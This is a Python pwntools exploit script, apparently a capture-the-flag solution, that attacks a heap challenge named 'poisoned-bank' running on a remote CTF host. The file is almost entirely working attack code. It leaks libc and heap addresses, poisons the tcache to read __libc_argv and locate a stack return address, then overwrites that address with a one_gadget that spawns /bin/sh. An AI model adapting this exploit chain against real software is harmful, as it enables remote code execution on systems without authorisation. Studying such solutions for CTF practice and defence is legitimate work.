from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote('poisoned-bank.challs.cornc.tf', 1337, ssl=True)
mallocArray = 0x202080
mallocSizes = 0x202050
mallocCounter = 0x202064 

def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


def firstmalloc():
    io.sendlineafter("List of items > ", b"")

def create(idx, size, data):
    io.sendlineafter("4. End the investigation\n> ", "1")
    io.sendlineafter("Choose the crate slot (1-4) > ", str(idx))
    io.sendlineafter("Enter crate size > ", str(size))
    io.sendlineafter("Load the crate with your evidence > ", data)

def delete(idx):
    io.sendlineafter("4. End the investigation\n> ", "2")
    io.sendlineafter("Select crate slot to free (1-4) > ", str(idx))

def show(idx):
    io.sendlineafter("4. End the investigation\n> ", "3")
    io.sendlineafter("Select crate slot to inspect (1-4) > ", str(idx))

def exit():
    io.sendlineafter("4. End the investigation\n> ", "4")

firstmalloc()
create(1, 0x10, "")
delete(0)
create(0, 0x18, "")
show(0)

leak = u64(io.recv(8))
libc.address = leak - 0x211f0a 
log.success("libc.address:-----> " + hex(libc.address))
libc_argv = libc.symbols["__libc_argv"]
log.success("libc_argv:-----> " + hex(libc_argv))
leak = u64(io.recv(8))
leak = u64(io.recv(6).ljust(8, b"\x00"))
heap = leak - 0x290
log.success("heap:-----> " + hex(heap))

create(2, 0x18, "2"*24)
create(3, 0x18, "3"*24)
delete(0)
create(0, 0x19, b"0"*24+b"\x31")
delete(2)
delete(1)
delete(3)


# tcache posioning
want_adr = (libc_argv - 0x10) ^ heap >> 12
payload = b"1"*0x18 + p64(0x21) 
payload += p64(want_adr)
create(1, 0x28, payload) # tcache[1]写入libc_argv地址
create(2, 0x10, "2")
create(3, 0x18, "")

show(3)
io.recv(16)
delate = 0x7ffcd9016338 - 0x7ffcd9016458
ret = u64(io.recv(6).ljust(8, b"\x00")) + delate
log.success("ret:-----> " + hex(ret))
# ddebug("b malloc\n b free\n continue")

create(4, 0x18, "")
delete(4)
delete(2)
delete(1)

want_adr = ret-8 ^ heap >> 12
payload = b"1"*0x18 + p64(0x21) 
payload += p64(want_adr)
create(4, 0x28, payload) # tcache[1]写入ret地址
create(2, 0x10, "2")
create(1, 0x18, p64(ret)+p64(libc.address+0xf79d2))
"""
0xf7977 execve("/bin/sh", rbp-0x50, r13)
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
0xf79d2 execve("/bin/sh", rbp-0x50, [rbp-0x70])
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
"""
ddebug("breakrva 0x010E5\ncontinue")
exit()
io.interactive()
